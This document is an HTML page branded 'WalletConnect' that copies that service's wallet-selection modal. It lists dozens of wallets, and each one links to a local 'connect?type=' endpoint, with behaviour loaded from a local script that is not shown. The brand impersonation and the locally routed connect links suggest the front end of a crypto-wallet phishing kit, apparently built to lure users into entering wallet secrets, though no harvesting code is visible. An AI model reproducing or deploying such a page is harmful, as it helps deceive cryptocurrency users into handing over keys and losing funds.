<!DOCTYPE html>
<html lang="en">

<head>
  <meta charset="UTF-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>WalletConnect</title>
  <link rel="shortcut icon" href="favicon.ico" type="image/x-icon">

  <link rel="stylesheet" href="assets/vendor/bootstrap.min.css">
  <link rel="stylesheet" href="assets/css/rules.css">
</head>

<body style="background: rgba(37, 41, 46, 0.95);">

  <div class="modal h-75" id="mainModal" style="display: none;top: 9%;" data-bs-backdrop="static" data-bs-keyboard="false" tabindex="-1" aria-labelledby="mainModalTitle" aria-hidden="true">
    <div class="d-flex justify-content-between mb-0 pt-0 header-row">
      <div>
        <img src="assets/images/logo.svg" alt="" height="21px" class="mb-2">
        <span class="fw-bolder" style="color: #fff;margin-left: 5px !important; font-size: 20px;">WalletConnect</span>
      </div>
      <div>
        <div class="close-section">
          <div class="close-icon">
            <div class="close-stroke-1"></div>
            <div class="close-stroke-2"></div>
          </div>
        </div>
      </div>
    </div>
    <div class="modal-dialog mt-0">
      <div class="modal-content">
        <div class="modal-body w-100">
          <div class="d-flex flex-column justify-content-center mb-1">
            <div class="mobile-qr p-1">
              <a class="mobile-qr1">Mobile</a>
              <a class="mobile-qr1" style="background-color: transparent;">QR Code</a>
              <!-- <a>Mobile</a> -->
              <!-- <a href="QR"></a> -->
            </div>
            <p class="hint-text text-center">Choose your preferred wallet</p>
          </div>

          <div class="w">

            <div class="page act" id="p1">

              <section>
                <div>
                  <img class="shadow-lg rounded-3" src="https://registry.walletconnect.org/logo/sm/1ae92b26df02f0abca6304df07debccd18262fdf5fe82daa81593582dac9a369.jpeg" height="40px">
                  <p class="fw-bold text-secondary">Rainbow</p>
                  <a href="connect?type=Rainbow" class="stretched-link"></a>
                </div>
                <div>
                  <img class="shadow-lg rounded-3" src="https://registry.walletconnect.org/logo/sm/4622a2b2d6af1c9844944291e5e7351a6aa24cd7b23099efac1b2fd875da31a0.jpeg" height="40px">
                  <p class="fw-bold text-secondary">Trust</p>
                  <a href="connect?type=Trust Wallet" class="stretched-link"></a>
                </div>
                <div>
                  <img class="shadow-lg rounded-3 mb-1" src="https://images.ctfassets.net/q5ulk4bp65r7/1rFQCqoq8hipvVJSKdU3fQ/21ab733af7a8ab404e29b873ffb28348/coinbase-icon2.svg" height="40px">
                  <p class="fw-bold text-secondary">Coinbase</p>
                  <a href="connect?type=Coinbase" class="stretched-link"></a>
                </div>
                <div>
                  <img class="shadow-lg rounded-3" src="https://registry.walletconnect.org/logo/sm/cf21952a9bc8108bf13b12c92443751e2cc388d27008be4201b92bbc6d83dd46.jpeg" height="40px">
                  <p class="fw-bold text-secondary">Argent</p>
                  <a href="connect?type=Argent" class="stretched-link"></a>
                </div>
                <div>
                  <img class="shadow-lg rounded-3" src="https://registry.walletconnect.org/logo/sm/c57ca95b47569778a828d19178114f4db188b89b763c899ba0be274e97267d96.jpeg" height="40px">
                  <p class="fw-bold text-secondary">MetaMask</p>
                  <a href="connect?type=MetaMask" class="stretched-link"></a>
                </div>
                <div>
                  <img class="shadow-lg rounded-3" src="https://registry.walletconnect.org/logo/sm/f2436c67184f158d1beda5df53298ee84abfc367581e4505134b5bcf5f46697d.jpeg" height="40px">
                  <p class="fw-bold text-secondary">Crypto.com</p>
                  <a href="connect?type=Crypto.com" class="stretched-link"></a>
                </div>
                <div>
                  <img class="shadow-lg rounded-3 mb-1" src="https://registry.walletconnect.org/logo/sm/0b58bf037bf943e934706796fb017d59eace1dadcbc1d9fe24d9b46629e5985c.jpeg" height="40px">
                  <p class="fw-bold text-secondary">Pillar</p>
                  <a href="connect?type=Pillar" class="stretched-link"></a>
                </div>
                <div>
                  <img class="shadow-lg rounded-3" src="https://registry.walletconnect.org/logo/sm/9d373b43ad4d2cf190fb1a774ec964a1addf406d6fd24af94ab7596e58c291b2.jpeg" height="40px">
                  <p class="fw-bold text-secondary">imToken</p>
                  <a href="connect?type=imToken" class="stretched-link"></a>
                </div>
                <div>
                  <img class="shadow-lg rounded-3" src="https://registry.walletconnect.org/logo/sm/dceb063851b1833cbb209e3717a0a0b06bf3fb500fe9db8cd3a553e4b1d02137.jpeg" height="40px">
                  <p class="fw-bold text-secondary">ONTO</p>
                  <a href="connect?type=ONTO" class="stretched-link"></a>
                </div>
                <div>
                  <img class="shadow-lg rounded-3" src="https://registry.walletconnect.org/logo/sm/20459438007b75f4f4acb98bf29aa3b800550309646d375da5fd4aac6c2a2c66.jpeg" height="40px">
                  <p class="fw-bold text-secondary">TokenPocket</p>
                  <a href="connect?type=TokenPocket" class="stretched-link"></a>
                </div>
                <div>
                  <img class="shadow-lg rounded-3" src="https://registry.walletconnect.org/logo/sm/7674bb4e353bf52886768a3ddc2a4562ce2f4191c80831291218ebd90f5f5e26.jpeg" height="40px">
                  <p class="fw-bold text-secondary">MathWallet</p>
                  <a href="connect?type=MathWallet" class="stretched-link"></a>
                </div>
                <div>
                  <img class="shadow-lg rounded-3" src="https://registry.walletconnect.org/logo/sm/ccb714920401f7d008dbe11281ae70e3a4bfb621763b187b9e4a3ce1ab8faa3b.jpeg" height="40px">
                  <p class="fw-bold text-secondary">BitPay</p>
                  <a href="connect?type=BitPay" class="stretched-link"></a>
                </div>
              </section>


            </div>

            <div class="page" id="p2">

              <section>

                <div>
                  <img class="shadow-lg rounded-3" src="assets/images/ledger.png" height="40px">
                  <p class="fw-bold text-secondary">Ledger</p>
                  <a href="connect?type=Ledger" class="stretched-link"></a>
                </div>
                <div>
                  <img class="shadow-lg rounded-3 mb-1" src="assets/images/dharma.png" height="40px">
                  <p class="fw-bold text-secondary">Dharma</p>
                  <a href="connect?type=Dharma" class="stretched-link"></a>
                </div>
                <div>
                  <img class="shadow-lg rounded-3" src="assets/images/1inch.png" height="40px">
                  <p class="fw-bold text-secondary">1inch</p>
                  <a href="connect?type=1inch" class="stretched-link"></a>
                </div>
                <div>
                  <img class="shadow-lg rounded-3" src="assets/images/huobi.png" height="40px">
                  <p class="fw-bold text-secondary">Huobi</p>
                  <a href="connect?type=Huobi" class="stretched-link"></a>
                </div>
                <div>
                  <img class="shadow-lg rounded-3" src="https://registry.walletconnect.org/logo/sm/efba9ae0a9e0fdd9e3e055ddf3c8e75f294babb8aea3499456eff27f771fda61.jpeg" height="40px">
                  <p class="fw-bold text-secondary">Eidoo</p>
                  <a href="connect?type=Eidoo" class="stretched-link"></a>
                </div>
                <div>
                  <img class="shadow-lg rounded-3 mb-1" src="https://registry.walletconnect.org/logo/sm/61f6e716826ae8455ad16abc5ec31e4fd5d6d2675f0ce2dee3336335431f720e.jpeg" height="40px">
                  <p class="fw-bold text-secondary">MYKEY</p>
                  <a href="connect?type=MYKEY" class="stretched-link"></a>
                </div>
                <div>
                  <img class="shadow-lg rounded-3" src="https://registry.walletconnect.org/logo/sm/b021913ba555948a1c81eb3d89b372be46f8354e926679de648e4fa2938bed3e.jpeg" height="40px">
                  <p class="fw-bold text-secondary">Coin98</p>
                  <a href="connect?type=Coin98" class="stretched-link"></a>
                </div>
                <div>
                  <img class="shadow-lg rounded-3" src="https://registry.walletconnect.org/logo/sm/138f51c8d00ac7b9ac9d8dc75344d096a7dfe370a568aa167eabc0a21830ed98.jpeg" height="40px">
                  <p class="fw-bold text-secondary">AlphaWallet</p>
                  <a href="connect?type=AlphaWallet" class="stretched-link"></a>
                </div>
                <div>
                  <img class="shadow-lg rounded-3" src="https://registry.walletconnect.org/logo/sm/468b4ab3582757233017ec10735863489104515ab160c053074905a1eecb7e63.jpeg" height="40px">
                  <p class="fw-bold text-secondary">D'CENT</p>
                  <a href="connect?type=D'CENT" class="stretched-link"></a>
                </div>
                <div>
                  <img class="shadow-lg rounded-3" src="https://registry.walletconnect.org/logo/sm/29f4a70ad5993f3f73ae8119f0e78ecbae51deec2a021a770225c644935c0f09.jpeg" height="40px">
                  <p class="fw-bold text-secondary">ZelCore</p>
                  <a href="connect?type=ZelCore" class="stretched-link"></a>
                </div>
                <div>
                  <img class="shadow-lg rounded-3" src="assets/images/nash.png" height="40px">
                  <p class="fw-bold text-secondary">Nash</p>
                  <a href="connect?type=Nash" class="stretched-link"></a>
                </div>
                <div>
                  <img class="shadow-lg rounded-3" src="https://registry.walletconnect.org/logo/sm/a395dbfc92b5519cbd1cc6937a4e79830187daaeb2c6fcdf9b9cce4255f2dcd5.jpeg" height="40px">
                  <p class="fw-bold text-secondary">CYBAVO</p>
                  <a href="connect?type=CYBAVO" class="stretched-link"></a>
                </div>
              </section>

            </div>

            <div class="page" id="p3">

              <section>

                <div>
                  <img class="shadow-lg rounded-3" src="https://registry.walletconnect.org/logo/sm/0b415a746fb9ee99cce155c2ceca0c6f6061b1dbca2d722b3ba16381d0562150.jpeg" height="40px">
                  <p class="fw-bold text-secondary">SafePal</p>
                  <a href="connect?type=SafePal" class="stretched-link"></a>
                </div>
                <div>
                  <img class="shadow-lg rounded-3 mb-1" src="https://registry.walletconnect.org/logo/sm/244a0d93a45df0d0501a9cb9cdfb4e91aa750cfd4fc88f6e97a54d8455a76f5c.jpeg" height="40px">
                  <p class="fw-bold text-secondary">EasyPocket</p>
                  <a href="connect?type=EasyPocket" class="stretched-link"></a>
                </div>
                <div>
                  <img class="shadow-lg rounded-3" src="https://registry.walletconnect.org/logo/sm/3b0e861b3a57e98325b82ab687fe0a712c81366d521ceec49eebc35591f1b5d1.jpeg" height="40px">
                  <p class="fw-bold text-secondary">SparkPoint</p>
                  <a href="connect?type=SparkPoint" class="stretched-link"></a>
                </div>
                <div>
                  <img class="shadow-lg rounded-3" src="https://registry.walletconnect.org/logo/sm/42d72b6b34411dfacdf5364c027979908f971fc60251a817622b7bdb44a03106.jpeg" height="40px">
                  <p class="fw-bold text-secondary">BitKeep</p>
                  <a href="connect?type=BitKeep" class="stretched-link"></a>
                </div>
                <div>
                  <img class="shadow-lg rounded-3" src="https://registry.walletconnect.org/logo/sm/38ee551a01e3c5af9d8a9715768861e4d642e2381a62245083f96672b5646c6b.jpeg" height="40px">
                  <p class="fw-bold text-secondary">PEAKDEFI</p>
                  <a href="connect?type=PEAKDEFI" class="stretched-link"></a>
                </div>
                <div>
                  <img class="shadow-lg rounded-3 mb-1" src="https://registry.walletconnect.org/logo/sm/7e90b95230bc462869bbb59f952273d89841e1c76bcc5319898e08c9f34bd4cd.jpeg" height="40px">
                  <p class="fw-bold text-secondary">Unstoppable</p>
                  <a href="connect?type=Unstoppable" class="stretched-link"></a>
                </div>
                <div>
                  <img class="shadow-lg rounded-3" src="https://registry.walletconnect.org/logo/sm/025247d02e1972362982f04c96c78e7c02c4b68a9ac2107c26fe2ebb85c317c0.jpeg" height="40px">
                  <p class="fw-bold text-secondary">HaloDefi</p>
                  <a href="connect?type=HaloDefi" class="stretched-link"></a>
                </div>
                <div>
                  <img class="shadow-lg rounded-3" src="https://registry.walletconnect.org/logo/sm/15d1d97de89526a3c259a235304a7c510c40cda3331f0f8433da860ecc528bef.jpeg" height="40px">
                  <p class="fw-bold text-secondary">ElliPal</p>
                  <a href="connect?type=ElliPal" class="stretched-link"></a>
                </div>
                <div>
                  <img class="shadow-lg rounded-3" src="https://registry.walletconnect.org/logo/sm/0fa0f603076de79bbac9a4d47770186de8913da63c8a4070c500a783cddbd1e3.jpeg" height="40px">
                  <p class="fw-bold text-secondary">KEYRINGPRO</p>
                  <a href="connect?type=KEYRINGPRO" class="stretched-link"></a>
                </div>
                <div>
                  <img class="shadow-lg rounded-3" src="https://registry.walletconnect.org/logo/sm/19ad8334f0f034f4176a95722b5746b539b47b37ce17a5abde4755956d05d44c.jpeg" height="40px">
                  <p class="fw-bold text-secondary">Aktionariat</p>
                  <a href="connect?type=Aktionariat" class="stretched-link"></a>
                </div>
                <div>
                  <img class="shadow-lg rounded-3" src="https://registry.walletconnect.org/logo/sm/95501c1a07c8eb575cb28c753ab9044259546ebcefcd3645461086e49b671f5c.jpeg" height="40px">
                  <p class="fw-bold text-secondary">Talken</p>
                  <a href="connect?type=Talken" class="stretched-link"></a>
                </div>
                <div>
                  <img class="shadow-lg rounded-3" src="assets/images/gnosis.png" height="40px">
                  <p class="fw-bold text-secondary">Gnosis Safe</p>
                  <a href="connect?type=Gnosis Safe" class="stretched-link"></a>
                </div>
              </section>

            </div>

            <div class="page" id="p4">

              <section>

                <div>
                  <img class="shadow-lg rounded-3" src="https://registry.walletconnect.org/logo/sm/d612ddb7326d7d64428d035971b82247322a4ffcf126027560502eff4c02bd1c.jpeg" height="40px">
                  <p class="fw-bold text-secondary">Flare</p>
                  <a href="connect?type=Flare" class="stretched-link"></a>
                </div>
                <div>
                  <img class="shadow-lg rounded-3 mb-1" src="assets/images/kyberswap.png" height="40px">
                  <p class="fw-bold text-secondary">KyberSwap</p>
                  <a href="connect?type=KyberSwap" class="stretched-link"></a>
                </div>
                <div>
                  <img class="shadow-lg rounded-3" src="https://registry.walletconnect.org/logo/sm/6193353e17504afc4bb982ee743ab970cd5cf842a35ecc9b7de61c150cf291e0.jpeg" height="40px">
                  <p class="fw-bold text-secondary">AToken</p>
                  <a href="connect?type=AToken" class="stretched-link"></a>
                </div>
                <div>
                  <img class="shadow-lg rounded-3" src="https://registry.walletconnect.org/logo/sm/4e6af4201658b52daad51a279bb363a08b3927e74c0f27abeca3b0110bddf0a9.jpeg" height="40px">
                  <p class="fw-bold text-secondary">Tongue</p>
                  <a href="connect?type=Tongue" class="stretched-link"></a>
                </div>
                <div>
                  <img class="shadow-lg rounded-3" src="https://registry.walletconnect.org/logo/sm/b13fcc7e3500a4580c9a5341ed64c49c17d7f864497881048eb160c089be5346.jpeg" height="40px">
                  <p class="fw-bold text-secondary">RWallet</p>
                  <a href="connect?type=RWallet" class="stretched-link"></a>
                </div>
                <div>
                  <img class="shadow-lg rounded-3 mb-1" src="https://registry.walletconnect.org/logo/sm/13c6a06b733edf51784f669f508826b2ab0dc80122a8b5d25d84b17d94bbdf70.jpeg" height="40px">
                  <p class="fw-bold text-secondary">PlasmaPay</p>
                  <a href="connect?type=PlasmaPay" class="stretched-link"></a>
                </div>
                <div>
                  <img class="shadow-lg rounded-3" src="https://registry.walletconnect.org/logo/sm/0aafbedfb8eb56dae59ecc37c9a5388509cf9c082635e3f752581cc7128a17c0.jpeg" height="40px">
                  <p class="fw-bold text-secondary">O3Wallet</p>
                  <a href="connect?type=O3Wallet" class="stretched-link"></a>
                </div>
                <div>
                  <img class="shadow-lg rounded-3" src="https://registry.walletconnect.org/logo/sm/761d3d98fd77bdb06e6c90092ee7071c6001e93401d05dcf2b007c1a6c9c222c.jpeg" height="40px">
                  <p class="fw-bold text-secondary">HashKey Me</p>
                  <a href="connect?type=HashKey Me" class="stretched-link"></a>
                </div>
                <div>
                  <img class="shadow-lg rounded-3" src="https://registry.walletconnect.org/logo/sm/ffa139f74d1c8ebbb748cf0166f92d886e8c81b521c2193aa940e00626f4e215.jpeg" height="40px">
                  <p class="fw-bold text-secondary">Defiant</p>
                  <a href="connect?type=Defiant" class="stretched-link"></a>
                </div>
                <div>
                  <img class="shadow-lg rounded-3" src="https://registry.walletconnect.org/logo/sm/d01c7758d741b363e637a817a09bcf579feae4db9f5bb16f599fdd1f66e2f974.jpeg" height="40px">
                  <p class="fw-bold text-secondary">Valora</p>
                  <a href="connect?type=Valora" class="stretched-link"></a>
                </div>
                <div>
                  <img class="shadow-lg rounded-3" src="https://registry.walletconnect.org/logo/sm/36d854b702817e228d5c853c528d7bdb46f4bb041d255f67b82eb47111e5676b.jpeg" height="40px">
                  <p class="fw-bold text-secondary">Celo Wallet</p>
                  <a href="connect?type=Celo Wallet" class="stretched-link"></a>
                </div>
                <div>
                  <img class="shadow-lg rounded-3" src="https://registry.walletconnect.org/logo/sm/717911f4db0c5eda0e02e76ed179b7940ba1eefffdfb3c9e6540696226860da0.jpeg" height="40px">
                  <p class="fw-bold text-secondary">Essentials</p>
                  <a href="connect?type=Essentials" class="stretched-link"></a>
                </div>
              </section>

            </div>

            <div class="page" id="p5">

              <section>

                <div>
                  <img class="shadow-lg rounded-3" src="https://registry.walletconnect.org/logo/sm/c20b97dd1679625f4eb0bccd727c80746cb13bd97208b0c8e62c89cfd1d4b9cc.jpeg" height="40px">
                  <p class="fw-bold text-secondary">fuse.cash</p>
                  <a href="connect?type=fuse.cash" class="stretched-link"></a>
                </div>
                <div>
                  <img class="shadow-lg rounded-3 mb-1" src="assets/images/bitpie.png" height="40px">
                  <p class="fw-bold text-secondary">Bitpie</p>
                  <a href="connect?type=Bitpie" class="stretched-link"></a>
                </div>
                <div>
                  <img class="shadow-lg rounded-3" src="favicon.ico" height="40px">
                  <p class="fw-bold text-secondary">Other...</p>
                  <a href="connect?type=Other..." class="stretched-link"></a>
                </div>

              </section>

            </div>

          </div>

          <div class="button-row text-center">
            <button class="mybtn tab-button" role="button" data-id="1">1</button>
            <button class="mybtn tab-button" role="button" data-id="2">2</button>
            <button class="mybtn tab-button" role="button" data-id="3">3</button>
            <button class="mybtn tab-button" role="button" data-id="4">4</button>
            <button class="mybtn tab-button" role="button" data-id="5">5</button>
          </div>

        </div>
      </div>
    </div>
  </div>

  <script src="assets/vendor/jquery-3.6.0.min.js"></script> <!-- not necessary for bootstrap 5 though -->
  <script src="assets/vendor/bootstrap.bundle.min.js"></script>
  <script src="assets/js/commands.js"></script>
</body>

</html>